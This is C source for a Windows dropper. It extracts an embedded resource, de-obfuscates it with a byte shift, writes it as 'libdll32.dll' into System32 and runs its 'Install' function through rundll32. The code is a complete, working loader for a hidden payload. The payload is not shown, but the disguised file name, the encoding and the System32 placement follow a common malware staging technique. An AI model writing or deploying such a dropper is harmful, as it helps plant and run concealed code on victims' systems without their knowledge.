#include <stdio.h>
#include <khopanwin32.h>
#include <khopanstring.h>
#include "resource.h"

#define FREE(x) if(LocalFree(x)) KHWin32ConsoleErrorW(GetLastError(), L"LocalFree")

#define SYSTEM32     L"System32"
#define DLL_NAME     L"libdll32.dll"
#define RUNDLL32EXE  L"rundll32.exe"
#define DLL_FUNCTION L"Install"

int main(int argc, char** argv) {
	printf("Finding resource\n");
	HRSRC resourceHandle = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

	if(!resourceHandle) {
		KHWin32ConsoleErrorW(GetLastError(), L"FindResourceW");
		return 1;
	}

	DWORD resourceSize = SizeofResource(NULL, resourceHandle);

	if(!resourceSize) {
		KHWin32ConsoleErrorW(GetLastError(), L"SizeofResource");
		return 1;
	}

	printf("Resource size: %lu byte(s)\nLoading resource\n", resourceSize);
	HGLOBAL resource = LoadResource(NULL, resourceHandle);

	if(!resource) {
		KHWin32ConsoleErrorW(GetLastError(), L"LoadResource");
		return 1;
	}

	BYTE* data = LockResource(resource);

	if(!data) {
		KHWin32ConsoleErrorW(GetLastError(), L"LockResource");
		return 1;
	}

	BYTE* buffer = LocalAlloc(LMEM_FIXED, resourceSize);

	if(!buffer) {
		KHWin32ConsoleErrorW(GetLastError(), L"LocalAlloc");
		return 1;
	}

	printf("Allocate memory: %lu byte(s)\n", resourceSize);

	for(DWORD i = 0; i < resourceSize; i++) {
		buffer[i] = (data[i] - 18) % 0xFF;
	}

	LPWSTR windowsDirectoryPath = KHWin32GetWindowsDirectoryW();

	if(!windowsDirectoryPath) {
		KHWin32ConsoleErrorW(GetLastError(), L"KHWin32GetWindowsDirectoryW");
		FREE(buffer);
		return 1;
	}

	LPWSTR system32Path = KHFormatMessageW(L"%ws\\" SYSTEM32, windowsDirectoryPath);
	FREE(windowsDirectoryPath);

	if(!system32Path) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		FREE(buffer);
		return 1;
	}

	wprintf(SYSTEM32 L": %ws\n", system32Path);
	LPWSTR libdll32Path = KHFormatMessageW(L"%ws\\" DLL_NAME, system32Path);

	if(!libdll32Path) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		FREE(system32Path);
		FREE(buffer);
		return 1;
	}

	printf("DLL: %ws\nCreate file\n", libdll32Path);
	HANDLE file = CreateFileW(libdll32Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	FREE(libdll32Path);

	if(file == INVALID_HANDLE_VALUE) {
		KHWin32DialogErrorW(GetLastError(), L"CreateFileW");
		FREE(system32Path);
		FREE(buffer);
		return 1;
	}

	DWORD written = 0;
	BOOL result = WriteFile(file, buffer, resourceSize, &written, NULL);
	FREE(buffer);
	
	if(!result) {
		KHWin32DialogErrorW(GetLastError(), L"WriteFile");
		FREE(system32Path);
		return 1;
	}

	printf("Size:    %lu byte(s)\nWritten: %lu byte(s)\n", resourceSize, written);

	if(resourceSize != written) {
		printf("Error: Resource size mismatch\n");
		FREE(system32Path);
		return 1;
	}

	if(!CloseHandle(file)) {
		KHWin32DialogErrorW(GetLastError(), L"CloseHandle");
		FREE(system32Path);
		return 1;
	}

	printf("File closed\n");
	LPWSTR rundll32Path = KHFormatMessageW(L"%ws\\" RUNDLL32EXE, system32Path);
	FREE(system32Path);

	if(!rundll32Path) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		return 1;
	}

	LPWSTR rundll32Argument = KHFormatMessageW(L"%ws " DLL_NAME L"," DLL_FUNCTION, rundll32Path);

	if(!rundll32Argument) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		FREE(rundll32Path);
		return 1;
	}

	STARTUPINFO startupInformation = {0};
	startupInformation.cb = sizeof(startupInformation);
	PROCESS_INFORMATION processInformation;
	printf("Running DLL File\n");
	result = CreateProcessW(rundll32Path, rundll32Argument, NULL, NULL, TRUE, 0, NULL, NULL, &startupInformation, &processInformation);
	FREE(rundll32Argument);
	FREE(rundll32Path);

	if(!result) {
		KHWin32DialogErrorW(GetLastError(), L"CreateProcessW");
		return 1;
	}

	int returnValue = 1;

	if(WaitForSingleObject(processInformation.hProcess, INFINITE) == WAIT_FAILED) {
		KHWin32DialogErrorW(GetLastError(), L"CloseHandle");
		goto closeHandles;
	}

	returnValue = 0;
closeHandles:
	printf("Closing Handles\n");

	if(!CloseHandle(processInformation.hProcess)) {
		KHWin32DialogErrorW(GetLastError(), L"CloseHandle");
		return 1;
	}

	if(!CloseHandle(processInformation.hThread)) {
		KHWin32DialogErrorW(GetLastError(), L"CloseHandle");
		return 1;
	}

	return returnValue;
}
